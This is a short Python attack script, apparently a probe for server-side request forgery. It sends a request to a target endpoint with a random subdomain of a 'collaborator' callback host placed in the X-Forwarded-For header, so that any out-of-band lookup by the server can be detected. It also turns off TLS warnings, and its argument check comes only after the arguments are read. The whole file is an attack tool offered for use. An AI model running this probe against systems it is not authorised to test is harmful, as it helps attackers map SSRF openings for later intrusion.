import requests
import sys
import string
import random
import logging
logging.basicConfig(level=logging.DEBUG)
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

S = 10
def main():
    target = sys.argv[1]
    ssrf_baby = sys.argv[2]
    endpoint = sys.argv[3]
    if len(sys.argv) >= 3:
        try:
            makeup = target+endpoint
            collaborator = ssrf_baby
            ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))
            collab = str(ran)+'.'+collaborator
            target_headers = {"X-Forwarded-For": collab}
            r = requests.get(makeup, headers=target_headers)
            print(r.status_code)
            print (r.headers)
        except Exception as error:
            print ("something went wrong")
if __name__ == '__main__':
    main()
